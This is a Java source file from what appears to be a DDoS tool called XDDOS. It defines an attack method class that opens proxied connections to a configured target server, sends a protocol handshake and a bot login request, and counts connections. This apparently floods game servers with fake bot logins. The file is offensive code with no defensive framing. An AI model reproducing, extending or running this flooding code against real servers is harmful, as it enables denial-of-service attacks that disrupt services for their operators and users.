package XD.XDDOS.methods;

import XD.XDDOS.XDDOS;
import XD.XDDOS.NettyBootstrap;
import XD.XDDOS.ProxyLoader;
import XD.XDDOS.utils.Handshake;
import XD.XDDOS.utils.LoginRequest;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;

public class YooniksCry implements Method {
  public static String name = "";//name of bot
  
  private Handshake handshake = new Handshake(XDDOS.protcolID, XDDOS.srvRecord, XDDOS.port, 2);
  
  private byte[] bytes = this.handshake.getWrappedPacket();
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    channel.writeAndFlush(Unpooled.buffer().writeBytes(this.handshake.getWrappedPacket()));
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream bbbb = new ByteBufOutputStream(b);
    channel.writeAndFlush(Unpooled.buffer().writeBytes((new LoginRequest(name)).getWrappedPacketC()));
    channel.writeAndFlush(b);
    channel.writeAndFlush(bbbb);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
  }
}
